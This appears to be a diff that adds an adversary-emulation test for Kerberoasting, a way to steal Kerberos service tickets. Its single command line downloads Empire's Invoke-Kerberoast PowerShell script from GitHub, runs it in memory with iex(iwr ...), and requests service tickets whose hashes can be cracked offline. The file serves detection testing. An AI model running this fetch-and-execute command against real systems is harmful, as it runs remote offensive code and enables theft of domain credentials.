@@ -1,0 +1,8 @@
+#TechniqueName: Steal or Forge Kerberos Tickets: Kerberoasting
+#AtomicTestName: Request for service tickets
+#Language: ps1
+
+#commands
+iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+Invoke-Kerberoast | fl
+
